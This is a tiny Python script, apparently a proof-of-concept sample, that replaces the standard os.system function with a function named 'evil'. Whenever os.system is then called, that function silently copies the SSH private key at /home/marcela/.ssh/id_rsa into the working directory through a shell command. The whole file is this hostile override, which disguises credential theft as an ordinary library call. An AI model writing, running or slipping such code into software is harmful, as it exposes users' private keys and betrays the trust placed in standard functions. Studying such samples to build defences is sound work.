import os
import subprocess

#os.system("echo hello")

def evil(dummy):
    subprocess.call(["cp /home/marcela/.ssh/id_rsa ."], shell=True);

os.system = evil
